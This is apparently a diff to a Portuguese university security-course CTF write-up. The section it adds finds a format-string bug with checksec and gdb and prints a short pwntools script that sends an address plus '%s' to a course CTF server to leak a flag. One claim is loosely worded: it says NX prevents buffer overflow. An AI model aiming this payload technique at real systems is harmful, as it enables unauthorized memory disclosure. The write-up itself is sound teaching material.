@@ -137,3 +137,53 @@ with open('badfile', 'wb') as f:
 
 **Servidor com o `target` alterado para `0x5000`.**<br>
 ![image 9](docs/images/Captura_de_ecr%C3%A3_2023-11-17_195730.png)
+
+## CTF - Desafio 1
+
+### Investigação
+
+- Usámos `checksec program` para conseguir as seguintes informções:<br>
+![image 10](docs/images/Captura_de_ecr%C3%A3_2023-11-18_011153.png)
+
+- `program` tem um *canary* o que dificulta *stack smashing attacks*.
+- O NX está ativado o que previne *buffer overflow*.
+- PIE está desativado, logo o programa e os ficheiros estão sempre nas mesmas posições o que significa que é mais fácil de os localizar.
+
+### Vulnerabilidade e Exploit
+
+- O código `printf(buffer);` é uma Vulnerabilidade, pois não expecifica o formato da string de que vai fazer print
+o que nos permite usar para conseguir ver a `flag`.
+- A `flag` está carregada na memória e pode ser acessada com `%s`.
+- Com o uso de **gdb** podemos chegar obter o endereço da `flag`.<br>
+![image 11](docs/images/Captura_de_ecr%C3%A3_2023-11-18_012832.png)
+- O endereço da `flag`, `0x804c060` em little endian de 32 bits é `\x60\xC0\x04\x08` que concatenamos com `%s` e colocamos no *exploit_example.py* para obter a flag.
+```python
+from pwn import *
+
+LOCAL = False
+
+if LOCAL:
+    p = process("./program")
+    """
+    O pause() para este script e permite-te usar o gdb para dar attach ao processo
+    Para dar attach ao processo tens de obter o pid do processo a partir do output deste programa. 
+    (Exemplo: Starting local process './program': pid 9717 - O pid seria  9717) 
+    Depois correr o gdb de forma a dar attach. 
+    (Exemplo: `$ gdb attach 9717` )
+    Ao dar attach ao processo com o gdb, o programa para na instrução onde estava a correr.
+    Para continuar a execução do programa deves no gdb  enviar o comando "continue" e dar enter no script da exploit.
+    """
+    pause()
+else:
+    p = remote("ctf-fsi.fe.up.pt", 4004)
+
+p.recvuntil(b"got:")
+p.sendline(b"\x60\xC0\x04\x08%s")
+p.interactive()
+```
+
+**Flag obtida após executar o exploit.**<br>
+
+![image 12](docs/images/Captura_de_ecr%C3%A3_2023-11-18_013800.png)
+
+## CTF - Desafio 2
